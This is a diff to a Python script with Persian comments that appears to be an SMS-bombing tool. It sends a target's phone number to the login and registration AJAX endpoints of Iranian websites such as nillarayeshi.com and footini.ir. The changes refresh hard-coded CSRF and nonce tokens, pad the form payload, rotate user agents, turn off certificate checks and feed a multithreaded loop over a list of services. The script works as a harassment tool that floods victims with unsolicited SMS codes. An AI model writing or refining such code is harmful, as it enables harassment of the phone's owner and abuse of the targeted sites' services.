@@ -109,23 +109,42 @@ def nillarayeshi(phone):
         session = requests.Session()
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
         
-        # استفاده از مقادیر ثابت
+        # استفاده از مقادیر جدید از اطلاعاتی که فرستادید
+        csrf = "34baf6a4f4"
+        nonce = "34baf6a4f4"
+        
         payload = {
             "action": "digits_check_mob",
             "countrycode": "+98",
             "mobileNo": formatted_phone,
-            "csrf": "b77d25383c",
+            "csrf": csrf,
             "login": "2",
+            "username": "",
+            "email": "",
+            "captcha": "",
+            "captcha_ses": "",
             "digits": "1",
             "json": "1",
-            "dig_nounce": "b77d25383c"
+            "whatsapp": "0",
+            "digits_reg_name": "نام",
+            "digregcode": "+98",
+            "digits_reg_mail": formatted_phone,
+            "digregscode2": "+98",
+            "mobmail2": "",
+            "digits_reg_password": "",
+            "dig_otp": "",
+            "code": "",
+            "dig_reg_mail": "",
+            "dig_nounce": nonce
         }
         
         headers = {
             "User-Agent": random.choice(user_agents),
-            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Accept": "*/*",
             "X-Requested-With": "XMLHttpRequest",
             "Origin": "https://nillarayeshi.com",
+            "Referer": "https://nillarayeshi.com/",
         }
         
         response = session.post(
@@ -136,8 +155,11 @@ def nillarayeshi(phone):
             verify=False
         )
         
+        print(f'{y}[Debug] nillarayeshi Status: {response.status_code}{a}')
+        print(f'{y}[Debug] nillarayeshi Response: {response.text}{a}')
+        
         if response.status_code == 200:
-            print(f'{g}(nillarayeshi) Request Successful - SMS Should be Sent{a}')
+            print(f'{g}(nillarayeshi) SMS Sent Successfully{a}')
             return True
         else:
             print(f'{r}[-] nillarayeshi Error: {response.status_code}{a}')
@@ -147,63 +169,11 @@ def nillarayeshi(phone):
         print(f"{r}[!] nillarayeshi Exception: {e}{a}")
         return False
 
-def Footini(phone):
-    try:
-        session = requests.Session()
-        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        
-        payload = {
-            "digt_countrycode": "+98",
-            "phone": formatted_phone,
-            "digits_reg_name": "نام",
-            "digits_reg_username": f"user{random.randint(10000, 99999)}",
-            "digits_reg_password": f"Pass{random.randint(1000, 9999)}",
-            "digits_process_register": "1",
-            "instance_id": "de6bca2e4448c81c7733fa67a04f5594",
-            "action": "digits_forms_ajax",
-            "type": "register",
-            "digits": "1",
-            "digits_form": "09819c58fd",
-        }
-        
-        headers = {
-            "User-Agent": random.choice(user_agents),
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Requested-With": "XMLHttpRequest",
-        }
-        
-        response = session.post(
-            "https://footini.ir/wp-admin/admin-ajax.php",
-            data=payload,
-            headers=headers,
-            timeout=15,
-            verify=False
-        )
-        
-        if response.status_code == 200:
-            print(f'{g}(Footini) Request Successful - SMS Should be Sent{a}')
-            return True
-        else:
-            print(f'{r}[-] Footini Error: {response.status_code}{a}')
-            return False
-            
-    except Exception as e:
-        print(f'{r}[!] Footini Exception: {e}{a}')
-        return False
 
-def Lendo(phone):
-    try:
-        print(f'{y}[!] Lendo: Requires digital signature, skipping...{a}')
-        return False
-    except Exception as e:
-        print(f'{r}[!] Lendo Exception: {e}{a}')
-        return False
-
-        
 # ==========================
 # لیست سرویس‌ها
 # ==========================
-services = [ Footini, nillarayeshi, SibApp]
+services = [  nillarayeshi, SibApp]
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
